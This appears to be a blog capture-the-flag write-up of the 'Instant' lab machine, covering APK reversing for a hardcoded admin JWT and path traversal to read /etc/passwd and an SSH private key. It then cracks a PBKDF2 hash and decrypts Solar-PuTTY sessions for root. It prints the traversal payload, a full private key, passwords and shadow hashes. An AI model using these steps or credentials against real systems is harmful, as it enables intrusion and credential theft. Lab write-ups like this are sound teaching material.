---
title: Instant-wp
slug: instantwp-z1t5kuz
url: /post/instantwp-z1t5kuz.html
date: '2024-10-16 00:00:00+08:00'
lastmod: '2026-04-14 23:48:32+08:00'
toc: true
isCJKLanguage: true
---



# Instant-wp

# Instant-wp

## Enum

### nmap

```
└─$ nmap 10.10.11.37 -p22,80 -sC -sV -o details     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-10-15 20:46 EDT
Nmap scan report for instant.htb (10.10.11.37)
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Instant Wallet
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.26 seconds
```

### web

　　web站点如下图所示，是个加密货币钱包

![image-20241016092722253](/images/image-20241016092722253-20250705113328-5fzirct.png)

　　存在一个app下载点，下载后用apktool逆向内容

### apk逆向

![image-20241016093328274](/images/image-20241016093328274-20250705113328-zor888v.png)

　　找到个钱包接口的子域名`mywalletv1.instant.htb`

![image-20241016093542725](/images/image-20241016093542725-20250705113328-7392tw5.png)

　　admin的activity中含有一个jwt，猜测可能需要固定的jwt才能访问admin页面

```
http://mywalletv1.instant.htb/api/v1/view/profile
Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA
```

　　携带header访问这个接口口

```
curl -X GET "http://mywalletv1.instant.htb/api/v1/view/profile" \
     -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" |jq
```

![044343476395b52da53031f7151ef81f](/images/044343476395b52da53031f7151ef81f-20250705113328-v93j074.png)

```json
{
  "Profile": {
    "account_status": "active",
    "email": "admin@instant.htb",
    "invite_token": "instant_admin_inv",
    "role": "Admin",
    "username": "instantAdmin",
    "wallet_balance": "10000000",
    "wallet_id": "f0eca6e5-783a-471d-9d8f-0162cbc900db"
  },
  "Status": 200
}
```

　　看上去那个钱包id比较有用，先继续看看有没有什么接口能用Authroization头去访问

![image-20241016095218351](/images/image-20241016095218351-20250705113328-xassach.png)

　　找到个交易接口，访问下看看

```
curl -X GET "http://mywalletv1.instant.htb/api/v1/initiate/transaction" \
     -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" |jq
```

　　返回405，访问方法不对，细看了一下代码，发现需要post许多其他参数，暂时作罢，看看其他地方有没有可用的。

　　后来看了一圈安卓逆向教程，还有个工具叫smail2java，能把smail文件转java，（悲）

　　找了一圈依然没发现什么东西，开始关注静态文件，发现`res/xml/network_security_config.xml`处存在一个子域名白名单

![image-20241016104843227](/images/image-20241016104843227-20250705113328-lo5qomd.png)

　　访问一下swagger-ui这一接口文档。

![image-20241016105014847](/images/image-20241016105014847-20250705113328-a3a3hok.png)

　　加一下路径

### swagger-ui

![image-20241016105307876](/images/image-20241016105307876-20250705113328-lmsy9qs.png)

　　访问一下日志api

```
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/view/logs" -H  "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" 
```

![image-20241016105636193](/images/image-20241016105636193-20250705113328-vfr06x9.png)

　　找到了一个日志文件，利用api查询文件

```
curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=1.log" -H  "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" 
```

![image-20241111182808311](/images/image-20241111182808311-20250705113328-i9zra5b.png)

## 路径穿越

```bash
┌──(kali㉿kali)-[~]
└─$ curl -X GET "http://swagger-ui.instant.htb/api/v1/admin/read/log?log_file_name=../../../../etc/passwd" -H  "accept: application/json" -H "Authorization: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MSwicm9sZSI6IkFkbWluIiwid2FsSWQiOiJmMGVjYTZlNS03ODNhLTQ3MWQtOWQ4Zi0wMTYyY2JjOTAwZGIiLCJleHAiOjMzMjU5MzAzNjU2fQ.v0qyyAqDSgyoNFHU7MgRQcDA0Bw99_8AEXKGtWZ6rYA" 
```

![image-20241111182850706](/images/image-20241111182850706-20250705113328-e208dx6.png)

　　结合log位置中暴露的用户名读私钥

![image-20241111183014200](/images/image-20241111183014200-20250705113328-1qygzl8.png)

　　整理一下格式

```python
content=["-----BEGIN OPENSSH PRIVATE KEY-----\n","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\n","-----END OPENSSH PRIVATE KEY-----\n"]
for i in content:
    print(i,end='') 
```

![image-20241111183526323](/images/image-20241111183526323-20250705113328-3e4z3xz.png)

## root

### enum

#### netstat

```
shirohige@instant:~$ netstat -ntpl
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:8808          0.0.0.0:*               LISTEN      1339/python3        
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:8888          0.0.0.0:*               LISTEN      1335/python3        
tcp        0      0 127.0.0.54:53           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                
```

#### 备份文件

```bash
shirohige@instant:/opt/backups/Solar-PuTTY$ cat sessions-backup.dat 
ZJlEkpkqLgj2PlzCyLk4gtCfsGO2CMirJoxxdpclYTlEshKzJwjMCwhDGZzNRr0fNJMlLWfpbdO7l2fEbSl/OzVAmNq0YO94RBxg9p4pwb4upKiVBhRY22HIZFzy6bMUw363zx6lxM4i9kvOB0bNd/4PXn3j3wVMVzpNxuKuSJOvv0fzY/ZjendafYt1Tz1VHbH4aHc8LQvRfW6Rn+5uTQEXyp4jE+ad4DuQk2fbm9oCSIbRO3/OKHKXvpO5Gy7db1njW44Ij44xDgcIlmNNm0m4NIo1Mb/2ZBHw/MsFFoq/TGetjzBZQQ/rM7YQI81SNu9z9VVMe1k7q6rDvpz1Ia7JSe6fRsBugW9D8GomWJNnTst7WUvqwzm29dmj7JQwp+OUpoi/j/HONIn4NenBqPn8kYViYBecNk19Leyg6pUh5RwQw8Bq+6/OHfG8xzbv0NnRxtiaK10KYh++n/Y3kC3t+Im/EWF7sQe/syt6U9q2Igq0qXJBF45Ox6XDu0KmfuAXzKBspkEMHP5MyddIz2eQQxzBznsgmXT1fQQHyB7RDnGUgpfvtCZS8oyVvrrqOyzOYl8f/Ct8iGbv/WO/SOfFqSvPQGBZnqC8Id/enZ1DRp02UdefqBejLW9JvV8gTFj94MZpcCb9H+eqj1FirFyp8w03VHFbcGdP+u915CxGAowDglI0UR3aSgJ1XIz9eT1WdS6EGCovk3na0KCz8ziYMBEl+yvDyIbDvBqmga1F+c2LwnAnVHkFeXVua70A4wtk7R3jn8+7h+3Evjc1vbgmnRjIp2sVxnHfUpLSEq4oGp3QK+AgrWXzfky7CaEEEUqpRB6knL8rZCx+Bvw5uw9u81PAkaI9SlY+60mMflf2r6cGbZsfoHCeDLdBSrRdyGVvAP4oY0LAAvLIlFZEqcuiYUZAEgXgUpTi7UvMVKkHRrjfIKLw0NUQsVY4LVRaa3rOAqUDSiOYn9F+Fau2mpfa3c2BZlBqTfL9YbMQhaaWz6VfzcSEbNTiBsWTTQuWRQpcPmNnoFN2VsqZD7d4ukhtakDHGvnvgr2TpcwiaQjHSwcMUFUawf0Oo2+yV3lwsBIUWvhQw2g=
```

　　https://github.com/VoidSec/SolarPuttyDecrypt/tree/master

　　这个工具需要用户密码才能解密session

#### uname -a

```
Linux instant 6.8.0-45-generic #45-Ubuntu SMP PREEMPT_DYNAMIC Fri Aug 30 12:02:04 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

#### suid

```
shirohige@instant:~$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/sudo
/usr/bin/mount
/usr/bin/umount
/usr/bin/fusermount3
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/gpasswd
/usr/lib/snapd/snap-confine
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
```

#### sqlite

　　wallet的api运行在shirohige的用户目录下，打包后发现源码中有sqlite数据库

![image-20241111190624778](/images/image-20241111190624778-20250705113328-ebvqdfo.png)

　　拷贝下来

```
#administrator
pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
#shirohige
pbkdf2:sha256:600000$YnRgjnim$c9541a8c6ad40bc064979bc446025041ffac9af2f762726971d8a28272c550ed
```

### hash格式标准化

![image-20241111191316339](/images/image-20241111191316339-20250705113328-e7c3dld.png)

　　网上查了一下，这个hash的格式需要重新整理一下才能被hashcat识别，阅读一下源码，看看他是怎么处理的

![image-20241111204448386](/images/image-20241111204448386-20250705113328-0ju5mti.png)

　　以`$`为分割，获取method、salt、hashval

```
pbkdf2:sha256:600000$I5bFyb0ZzD69pNX8$e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978
```

　　分割后变成如下形式

```
['pbkdf2:sha256:600000', 'I5bFyb0ZzD69pNX8', 'e9e4ea5c280e0766612295ab9bff32e5fa1de8f6cbb6586fab7ab7bc762bd978']
```

　　经过方法和interations的判断后，执行加密操作

![image-20241111204755025](/images/image-20241111204755025-20250705113328-jarpry8.png)

　　看一下salt和hashval有没有被编码处理

![image-20241111204841788](/images/image-20241111204841788-20250705113328-bkrdz06.png)

　　只是简单的转成了字节流，那么按照hashcat的要求，

![image-20241111205035069](/images/image-20241111205035069-20250705113328-8dtpsvu.png)

　　我们需要手动拼接一下，并且把hashval的值转成二进制后再进行base64编码，salt直接进行base64编码，处理结果如下

```
#administrator
sha256:600000:STViRnliMFp6RDY5cE5YOA==:6eTqXCgOB2ZhIpWrm/8y5fod6PbLtlhvq3q3vHYr2Xg=
#shirohige
sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=
```

　　用户的hash爆破成功了

```
┌──(kali㉿kali)-[~/Desktop/instant]
└─$ hashcat -m 10900 hash /usr/share/wordlists/rockyou.txt

sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+smvL3YnJpcdiignLFUO0=:estrella
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 10900 (PBKDF2-HMAC-SHA256)
Hash.Target......: sha256:600000:WW5SZ2puaW0=:yVQajGrUC8Bkl5vERgJQQf+s...LFUO0=
Time.Started.....: Mon Nov 11 08:03:04 2024 (4 secs)
Time.Estimated...: Mon Nov 11 08:03:08 2024 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      210 H/s (8.05ms) @ Accel:256 Loops:1024 Thr:1 Vec:16
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1024/14344385 (0.01%)
Rejected.........: 0/1024 (0.00%)
Restore.Point....: 0/14344385 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:599040-599999
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> bethany
Hardware.Mon.#1..: Util: 92%

Started: Mon Nov 11 08:03:03 2024
Stopped: Mon Nov 11 08:03:10 2024
```

　　口令复用失败，linux密码不是这个。

### SolarPuttySession

　　https://github.com/VoidSec/SolarPuttyDecrypt/tree/master

　　尝试用上面获得的密码解密

```
D:\tools\windows\SolarPuttyDecrypt_v1>SolarPuttyDecrypt.exe ./sessions-backup.dat "estrella"
-----------------------------------------------------
SolarPutty's Sessions Decrypter by VoidSec
-----------------------------------------------------

{
  "Sessions": [
    {
      "Id": "066894ee-635c-4578-86d0-d36d4838115b",
      "Ip": "10.10.11.37",
      "Port": 22,
      "ConnectionType": 1,
      "SessionName": "Instant",
      "Authentication": 0,
      "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
      "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
      "LastTimeOpen": "0001-01-01T00:00:00",
      "OpenCounter": 1,
      "SerialLine": null,
      "Speed": 0,
      "Color": "#FF176998",
      "TelnetConnectionWaitSeconds": 1,
      "LoggingEnabled": false,
      "RemoteDirectory": ""
    }
  ],
  "Credentials": [
    {
      "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
      "CredentialsName": "instant-root",
      "Username": "root",
      "Password": "12**24nzC!r0c%q12",
      "PrivateKeyPath": "",
      "Passphrase": "",
      "PrivateKeyContent": null
    }
  ],
  "AuthScript": [],
  "Groups": [],
  "Tunnels": [],
  "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}

-----------------------------------------------------
[+] DONE Decrypted file is saved in: C:\Users\Dinglijun\Desktop\SolarPutty_sessions_decrypted.txt
```

　　成功解出来数据，其中包含了root密码

## hash

```
root:$y$j9T$kbk3gZheVl2NWS6Kg2bYA.$LxNokXrLQvRyfmzXJHiZgzH73o2.Dk6UMGHsyj/Er./:19945:0:99999:7:::
shirohige:$y$j9T$EIEFkB5maGHp2kSFVdu6Q/$7uwKO1Xx2qzjNyqWuNBADn6sCgguYDUX4wfsql9Geq4:19945:0:99999:7:::
```
